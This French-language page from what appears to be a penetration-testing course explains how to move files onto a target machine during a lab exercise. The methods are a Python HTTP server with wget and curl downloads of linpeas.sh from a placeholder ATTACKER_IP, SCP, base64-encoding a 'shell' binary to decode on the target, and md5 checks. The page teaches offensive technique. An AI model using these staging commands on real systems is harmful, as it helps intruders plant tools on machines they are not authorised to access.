# Transfert de fichiers

[<< Précédent : Élévation de privilèges](06-elevation-de-privileges.md) | [Suivant : Walkthrough Nibbles >>](08-walkthrough-nibbles.md)

---

## Méthode principale : serveur HTTP Python

```bash
# Sur l'attaquant : démarrer un serveur HTTP
cd /tmp && python3 -m http.server 8000

# Sur la cible : télécharger
wget http://ATTACKER_IP:8000/linpeas.sh
curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh
```

---

## SCP (si SSH disponible)

```bash
scp linpeas.sh user@TARGET_IP:/tmp/linpeas.sh
```

---

## Base64 (quand le réseau est filtré)

Utile quand les connexions sortantes sont bloquées. On encode le fichier, on copie-colle la chaine, et on decode sur la cible.

```bash
# Encoder sur l'attaquant
base64 shell -w 0

# Decoder sur la cible
echo "f0VMRgIBAQA...lIuy9iaW4vc2gA" | base64 -d > shell
```

---

## Vérification d'intégrité

Toujours vérifier que le fichier n'a pas été corrompu pendant le transfert :

```bash
# Sur l'attaquant
md5sum shell
# -> 321de1d7e7c3735838890a72c9ae7d1d

# Sur la cible
md5sum shell
# -> 321de1d7e7c3735838890a72c9ae7d1d  (doit être identique)
```

> Voir [cheatsheet file-transfers](../../../cheatsheets/file-transfers.md) pour Windows et autres méthodes.
